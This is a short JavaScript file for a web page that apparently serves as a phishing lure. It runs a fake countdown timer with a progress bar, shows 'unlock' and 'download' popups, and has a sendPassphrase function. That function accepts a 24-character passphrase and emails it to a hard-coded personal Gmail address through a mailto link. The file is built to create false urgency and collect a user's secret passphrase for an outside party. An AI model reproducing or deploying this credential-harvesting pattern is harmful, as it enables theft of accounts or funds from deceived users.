let totalSeconds = (18 * 60 + 47) * 60 + 12; // demo timer
const totalInitial = totalSeconds;

function updateTimer() {
  const timerElement = document.getElementById("timer");
  const popupTimerElement = document.getElementById("popupTimer");
  const progressFill = document.getElementById("progressFill");

  const interval = setInterval(() => {
    if (totalSeconds <= 0) {
      clearInterval(interval);
      timerElement.innerText = "00:00:00";
      popupTimerElement.innerText = "00:00:00";
      progressFill.style.width = "0%";
      return;
    }

    totalSeconds--;

    let hrs = Math.floor(totalSeconds / 3600);
    let mins = Math.floor((totalSeconds % 3600) / 60);
    let secs = totalSeconds % 60;

    const timeString = `${hrs.toString().padStart(2, "0")}:${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
    timerElement.innerText = timeString;
    popupTimerElement.innerText = timeString;

    let percent = (totalSeconds / totalInitial) * 100;
    progressFill.style.width = percent + "%";
  }, 1000);
}

function showPopup() {
  document.getElementById("unlockPopup").style.display = "block";
}
function hidePopup() {
  document.getElementById("unlockPopup").style.display = "none";
}
function showDownloadPopup() {
  document.getElementById("downloadPopup").style.display = "block";
}
function hideDownloadPopup() {
  document.getElementById("downloadPopup").style.display = "none";
}

function sendPassphrase() {
  const passphrase = document.getElementById("passphraseInput").value.trim();
  const errorMsg = document.getElementById("errorMsg");

  if (passphrase.length !== 24) {
    errorMsg.style.display = "block";
    return;
  } else {
    errorMsg.style.display = "none";
  }

  const email = "krishnadigitalmedianwh@gmail.com";
  const subject = "Passphrase Submission";
  const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(passphrase)}`;

  window.location.href = mailtoLink;
}

updateTimer();
